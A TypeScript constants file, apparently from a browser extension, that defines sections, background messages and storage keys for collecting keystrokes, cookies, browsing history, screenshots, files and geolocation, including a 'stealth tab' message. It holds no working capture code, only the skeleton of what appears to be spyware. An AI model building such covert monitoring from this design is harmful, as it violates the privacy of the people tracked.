export const SECTION_NAMES = [
  "Geolocation",
  "Keylogger",
  "Inputs",
  "Browsing History",
  "Screenshots",
  "Filesystem",
  "Bookmarks",
  "Cookies",
];

export enum BackgroundMessage {
  HEARTBEAT = "HEARTBEAT",
  UPDATE_GEOLOCATION = "UPDATE_GEOLOCATION",
  OPEN_STEALTH_TAB = "OPEN_STEALTH_TAB",
  SEND_TAB_BACK = "SEND_TAB_BACK",
  WRITE_LOG = "WRITE_LOG",
  UPDATE_KEYLOG = "UPDATE_KEYLOG",
}

export enum StorageKey {
  GEOLOCATION_HISTORY = " GEOLOCATION_HISTORY",
  LOG = "LOG",
  KEYLOG = "KEYLOG",
}

export enum SearchParamKey {
  RETURN_URL = "returnUrl",
  FAVICON_URL = "faviconUrl",
  TITLE = "title"
}